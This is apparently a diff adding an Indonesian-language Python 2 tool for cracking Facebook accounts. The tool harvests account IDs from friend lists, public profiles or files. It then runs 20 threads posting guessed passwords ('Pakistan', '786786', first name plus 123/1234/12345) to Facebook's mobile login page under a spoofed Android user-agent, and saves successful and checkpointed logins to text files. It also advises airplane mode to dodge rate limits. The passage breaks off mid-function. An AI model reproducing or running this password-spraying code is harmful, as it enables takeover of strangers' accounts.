+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_pakis()
+
+
+def pilih_pakis():
+	teak = raw_input('\x1b[0;90m>\x1b[0;97m ')
+	if teak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_pakis()
+	elif teak == '1':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+		
+	elif teak == '2':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mID Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+		time.sleep(0.07)
+		
+		try:
+			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+			sp = json.loads(pok.text)
+			print '\x1b[0;91m\xe2\x80\xa2\x1b[0;90m Nama \x1b[0;91m:\x1b[0;92m ' + sp['name']
+		except KeyError:
+			print '\x1b[0;91m! ID publik/teman tidak ada'
+			raw_input('\n\x1b[1;97m< \x1b[0;90mKembali \x1b[0;97m>')
+			crack_pakis()
+		except requests.exceptions.ConnectionError:
+			print '\x1b[0;91m! Tidak ada koneksi'
+			keluar()
+
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		
+	elif teak == '3' or teak == '03':
+		os.system('clear')
+		print logo
+		
+		try:
+			print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+			time.sleep(0.07)
+			idlist = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mNama File\x1b[0;91m :\x1b[0;92m ')
+			time.sleep(0.07)
+			for line in open(idlist, 'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\x1b[0;91mFile tidak ada ! '
+			raw_input('\x1b[0;97m<\x1b[0;90m Kembali\x1b[0;97m >')
+		except IOError:
+			print '\x1b[0;91mFile tidak ada !'
+			raw_input('\n\x1b[0;97m< \x1b[0;90mKembali \x1b[0;97m>')
+			crack_pakis()
+		
+
+	if teak == '0' or teak == '00':
+		crack_teman()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_pakis()
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(art):
+		ef = art
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			ah = requests.get('https://graph.facebook.com/' + ef + '/?access_token=' + toket)
+			p = json.loads(ah.text)
+			pb = 'Pakistan'
+			rep = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': ef,
+				'pass': pb,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xs = rep.content
+			if 'mbasic_logout_button' in xs or 'save-device' in xs:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + ef + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pb
+				oke = open('done/pakis.txt', 'a')
+				oke.write('\n[Berhasil] ' + ef + ' \xe2\x88\x86 ' + pb)
+				oke.close()
+				oks.append(ef)
+			elif 'checkpoint' in xs:
+				print '\x1b[0;90m[Cekpoint]\x1b[0;97m ' + ef + ' \x1b[0;90m\xe2\x88\x86\x1b[0;97m ' + pb
+				cek = open('done/pakis.txt', 'a')
+				cek.write('\n[Cekpoint] ' + ef + ' \xe2\x88\x86 ' + pb)
+				cek.close()
+				cekpoint.append(ef)
+			else:
+				pb2 = '786786'
+				rep = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': ef,
+					'pass': pb2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xs = rep.content
+				if 'mbasic_logout_button' in xs or 'save-device' in xs:
+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + ef + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pb2
+					oke = open('done/pakis.txt', 'a')
+					oke.write('\n[Berhasil] ' + ef + ' \xe2\x88\x86 ' + pb2)
+					oke.close()
+					oks.append(ef)
+				elif 'checkpoint' in xs:
+					print '\x1b[0;90m[Cekpoint]\x1b[0;97m ' + ef + ' \x1b[0;90m\xe2\x88\x86\x1b[0;97m ' + pb2
+					cek = open('done/pakis.txt', 'a')
+					cek.write('\n[Cekpoint] ' + ef + ' \xe2\x88\x86 ' + pb2)
+					cek.close()
+					cekpoint.append(ef)
+				else:
+					pb3 = p['first_name'] + '1234'
+					rep = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': ef,
+						'pass': pb3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xs = rep.content
+					if 'mbasic_logout_button' in xs or 'save-device' in xs:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + ef + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pb3
+						oke = open('done/pakis.txt', 'a')
+						oke.write('\n[Berhasil] ' + ef + ' \xe2\x88\x86 ' + pb3)
+						oke.close()
+						oks.append(ef)
+					elif 'checkpoint' in xs:
+						print '\x1b[0;90m[Cekpoint]\x1b[0;97m ' + ef + ' \x1b[0;90m\xe2\x88\x86\x1b[0;97m ' + pb3
+						cek = open('done/pakis.txt', 'a')
+						cek.write('\n[Cekpoint] ' + ef + ' \xe2\x88\x86 ' + pb3)
+						cek.close()
+						cekpoint.append(ef)
+					else:
+						pb4 = p['first_name'] + '12345'
+						rep = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': ef,
+							'pass': pb4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xs = rep.content
+						if 'mbasic_logout_button' in xs or 'save-device' in xs:
+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + ef + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pb4
+							oke = open('done/pakis.txt', 'a')
+							oke.write('\n[Berhasil] ' + ef + ' \xe2\x88\x86 ' + pb4)
+							oke.close()
+							oks.append(ef)
+						elif 'checkpoint' in xs:
+							print '\x1b[0;90m[Cekpoint]\x1b[0;97m ' + ef + ' \x1b[0;90m\xe2\x88\x86\x1b[0;97m ' + pb4
+							cek = open('done/pakis.txt', 'a')
+							cek.write('\n[Cekpoint] ' + ef + ' \xe2\x88\x86 ' + pb4)
+							cek.close()
+							cekpoint.append(ef)
+						else:
+							pb5 = p['first_name'] + '123'
+							rep = requests.post('https://mbasic.facebook.com/login.php', data = {
+								'email': ef,
+								'pass': pb5,
+								'login': 'submit' }, headers = {
+								'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+							xs = rep.content
+							if 'mbasic_logout_button' in xs or 'save-device' in xs:
+								print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + ef + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pb5
+								oke = open('done/pakis.txt', 'a')
+								oke.write('\n[Berhasil] ' + ef + ' \xe2\x88\x86 ' + pb5)
+								oke.close()
+								oks.append(ef)
+							elif 'checkpoint' in xs:
+								print '\x1b[0;90m[Cekpoint]\x1b[0;97m ' + ef + ' \x1b[0;90m\xe2\x88\x86\x1b[0;97m ' + pb5
+								cek = open('done/pakis.txt', 'a')
+								cek.write('\n[Cekpoint] ' + ef + ' \xe2\x88\x86 ' + pb5)
+								cek.close()
+								cekpoint.append(ef)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;90mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;90mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;90m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;90mCP \x1b[0;90mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/pakis.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;90mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+
+def crack_usa():
+	global toket
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;95m1.\x1b[0;97m Crack Dari Daftar Teman'
+	time.sleep(0.07)
+	print '\x1b[0;95m2.\x1b[0;97m Crack Dari Publik/Teman'
+	time.sleep(0.07)
+	print '\x1b[0;95m3.\x1b[0;97m Crack Dari File'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_usa()
+
+
+def pilih_usa():
+	teak = raw_input('\x1b[0;95m>\x1b[0;97m ')
+	if teak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_usa()
+	elif teak == '1':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+		
+	elif teak == '2':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mID Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+		time.sleep(0.07)
+		
+		try:
+			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+			sp = json.loads(pok.text)
+			print '\x1b[0;91m\xe2\x80\xa2\x1b[0;95m Nama \x1b[0;91m:\x1b[0;92m ' + sp['name']
+		except KeyError:
+			print '\x1b[0;91m! ID publik/teman tidak ada'
+			raw_input('\n\x1b[1;97m< \x1b[0;95mKembali \x1b[0;97m>')
+			crack_usa()
+		except requests.exceptions.ConnectionError:
+			print '\x1b[0;91m! Tidak ada koneksi'
+			keluar()
+
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		
+	elif teak == '3' or teak == '03':
+		os.system('clear')
+		print logo
+		
+		try:
+			print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+			time.sleep(0.07)
+			idlist = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mNama File\x1b[0;91m :\x1b[0;92m ')
+			time.sleep(0.07)
+			for line in open(idlist, 'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\x1b[0;91mFile tidak ada ! '
+			raw_input('\x1b[0;97m<\x1b[0;95m Kembali\x1b[0;97m >')
+		except IOError:
+			print '\x1b[0;91mFile tidak ada !'
+			raw_input('\n\x1b[0;97m< \x1b[0;95mKembali \x1b[0;97m>')
+			crack_usa()
+		
+
+	if teak == '0' or teak == '00':
+		crack_teman()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_usa()
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;95mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(arg):
+		em = arg
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
+			v = json.loads(an.text)
+			px = v['first_name'] + '123'
+			rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': em,
+				'pass': px,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xo = rex.content
+			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + px
+				oke = open('done/usa.txt', 'a')
+				oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + px)
+				oke.close()
+				oks.append(em)
+			elif 'checkpoint' in xo:
+				print '\x1b[0;95m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;95m\xe2\x88\x86\x1b[0;97m ' + px
+				cek = open('done/usa.txt', 'a')
+				cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + px)
+				cek.close()
+				cekpoint.append(em)
+			else:
+				px2 = v['first_name'] + '12345'
+				rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': em,
+					'pass': px2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xo = rex.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
